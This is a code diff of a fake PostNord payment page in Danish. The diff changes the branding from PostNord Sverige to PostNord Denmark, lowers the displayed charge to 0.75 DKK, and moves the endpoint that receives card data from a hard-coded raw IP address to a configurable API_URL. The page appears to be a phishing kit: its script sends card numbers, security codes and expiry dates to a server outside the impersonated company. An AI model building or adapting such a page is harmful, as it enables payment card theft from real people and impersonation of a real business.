@@ -22,18 +22,18 @@
     <div class="main">
       <div class="main_header">
         <img src="img/sx.png" alt="" />
-        <p style="margin-left: 0.3rem">PostNord Sverige AB</p>
+        <p style="margin-left: 0.3rem">PostNord Denmark A/S</p>
       </div>
       <div class="main_center">
         <br />
         <br />
         <p>
           Forhandler：
-          <span>PostNord Sverige AB</span>
+          <span>PostNord Denmark A/S</span>
         </p>
         <p>
           Beløb：
-          <span>1950,00 (SEK)</span>
+          <span>0.75 (DKK)</span>
         </p>
         <br />
         <p>
@@ -132,7 +132,7 @@
           data.securityCode = code;
           data.expDate = month + '/' + year;
 
-          fetch('https://155.94.182.31:8080user/addCardInfo', {
+          fetch(API_URL + '/user/addCardInfo', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
